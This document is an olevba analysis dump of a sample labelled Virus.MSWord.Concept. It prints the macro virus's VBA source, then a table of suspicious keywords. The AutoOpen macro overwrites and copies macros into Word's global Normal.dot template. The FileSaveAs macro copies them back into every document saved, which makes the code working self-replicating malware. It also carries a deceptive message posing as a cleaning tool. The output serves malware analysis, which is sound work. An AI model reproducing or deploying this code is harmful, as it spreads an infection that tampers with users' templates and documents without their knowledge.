olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Concept-73c2865d2c97af25c17b04f9faa7a102845e0a92
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Concept-73c2865d2c97af25c17b04f9faa7a102845e0a92 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: Virus.MSWord.Concept-73c2865d2c97af25c17b04f9faa7a102845e0a92 - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"

End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Concept-73c2865d2c97af25c17b04f9faa7a102845e0a92 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
On Error Resume Next
WordBasic.ToolsMacro Name:="Normal.dot:AAAZA" + "O", Delete:=1
WordBasic.ToolsMacro Name:="Normal.dot:AAAZF" + "S", Delete:=1
WordBasic.ToolsMacro Name:="Normal.dot:FileSaveAs", Delete:=1
WordBasic.ToolsMacro Name:="Normal.dot:FileSave", Delete:=1
WordBasic.ToolsMacro Name:="Normal.dot:FileNew", Delete:=1
WordBasic.ToolsMacro Name:="Normal.dot:PayLoad", Delete:=1
WordBasic.ToolsMacro Name:="Normal.dot:FileOpen", Delete:=1


On Error GoTo -1: On Error GoTo Abort
sMe$ = WordBasic.[FileName$]()

sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy sTMacro$, "Global:AutoOpen"

sTMacro$ = sMe$ + ":FileSave"
WordBasic.MacroCopy sTMacro$, "Global:Filesave"

sTMacro$ = sMe$ + ":FileSaveAs"
WordBasic.MacroCopy sTMacro$, "Global:FileSaveAs"

sTMacro$ = sMe$ + ":FileNew"
WordBasic.MacroCopy sTMacro$, "Global:FileNew"

sTMacro$ = sMe$ + ":FileOpen"
WordBasic.MacroCopy sTMacro$, "Global:FileOpen"

sTMacro$ = sMe$ + ":Payb"
WordBasic.MacroCopy sTMacro$, "Global:PayLoad"

WordBasic.MsgBox "Your system may or may not be clean. Please close CleanW and the open it AGAIN."
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Concept-73c2865d2c97af25c17b04f9faa7a102845e0a92 - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
Dim sMe$
Dim sTMacro$
'this becomes the FileSaveAs for the global template
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo Bail
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
sMe$ = WordBasic.[FileName$]()

sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:AutoOpen", sTMacro$

sTMacro$ = sMe$ + ":FileSaveAs"
WordBasic.MacroCopy "Global:FileSaveAs", sTMacro$

sTMacro$ = sMe$ + ":FileSave"
WordBasic.MacroCopy "Global:FileSave", sTMacro$

sTMacro$ = sMe$ + ":FileNew"
WordBasic.MacroCopy "Global:FileNew", sTMacro$

WordBasic.FileSaveAs dlg
GoTo Done

Bail:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|open                |May open a file                              |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

